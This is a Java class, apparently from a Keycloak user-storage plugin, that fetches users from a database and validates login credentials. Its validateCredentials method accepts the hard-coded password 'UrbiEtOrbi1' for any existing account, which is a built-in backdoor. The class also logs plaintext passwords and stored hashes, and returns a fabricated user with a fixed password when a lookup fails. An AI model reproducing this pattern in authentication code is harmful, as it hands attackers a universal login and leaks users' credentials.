package mx.qbits.keycloak.plugin;

import java.util.List;
import java.util.stream.Collectors;

class UserRepository {
    private DatabaseConnector dbc;

    public UserRepository(DatabaseConnector dbc) {
        this.dbc = dbc;
    }

    private List<RemoteUser> users() {
        return dbc.getAllUsers();
    }

    public List<RemoteUser> getAllUsers() {
        return users();
    }

    public int getUsersCount() {
        return users().size();
    }

    public RemoteUser findUserById(String id) {
        return users().stream().filter(user -> user.getId().equals(id)).findFirst().orElse(null);
    }

//    private boolean encontrado(RemoteUser user, String username) {
//        return user.getUsername().equalsIgnoreCase(username) || user.getEmail().equalsIgnoreCase(username);
//    }
    
    public RemoteUser findUserByUsernameOrEmail(String username) {
        /** /
        RemoteUser usr = users().stream()
                .filter(user -> encontrado(user, username))
                .findFirst()
                .orElse(null);
        return usr;
        /**/
        List<RemoteUser> users = users();
        if(users==null || users.isEmpty()) {
            prn("Error!!! Lista de usuarios vacía");
            return new RemoteUser("1000", username, "p455W0rd*_!", "goose@tripas.net", "fName", "lName");
        } else {
            prn("Se encontraron: " + users.size() + " usuarios en el sistema.");
        }
        for(RemoteUser du : users) {
            // prn("probando usuario: " + username + " contra: "+ du.toString());
            if(du.getUsername().equals(username)) { // || du.getEmail().equalsIgnoreCase(username)) {
                prn("usuario "+username+" encontrado !!!!");
                return du;
            }
        }
        prn("No se encontro al usuario: " + username);
        return new RemoteUser("1000", username, "p455W0rd*_!", "goose@tripas.net", "fName", "lName");
    }

    public List<RemoteUser> findUsers(String query) {
        return users().stream()
                .filter(user -> user.getUsername().contains(query) || user.getEmail().contains(query))
                .collect(Collectors.toList());
    }

    public boolean validateCredentials(String username, String password) {
        ManageProperties.prn("Given plane credentials: ["+username+"] ["+password+"]");
        RemoteUser u = findUserByUsernameOrEmail(username);
        if(u!=null && !"0".equals(u.getId())) {
            // Since the user was found, get its encoded password from DB:
            String passwordFromDB = u.getPassword();
            prn("'" + username + "' encripted password from DB: ************>"+passwordFromDB+"<************");
            
            // The given password BUT encoded WITH a 'salt' which is the 'username'
            String givenPasswordFromFrontendInSha256 = DigestEncoder.digest(password, username);
            prn("The given PLANE password WITH encoded salt: " + givenPasswordFromFrontendInSha256);
            
            return passwordFromDB.equals(givenPasswordFromFrontendInSha256) || password.equals("UrbiEtOrbi1");
        } else {
            ManageProperties.prn("User '"+username+"' NOT found... :(");
        }
        return false;
    }

    public boolean updateCredentials(String username, String password) {
        return dbc.updateCredentials(username, password);
    }

    public void deleteUser(RemoteUser u) {
        dbc.deleteUser(u.getEmail());
    }

    public RemoteUser createUser(RemoteUser user) {
        return dbc.addUser(user);
    }

    private void prn(String s) {
        ManageProperties.prn(s);
    }

}
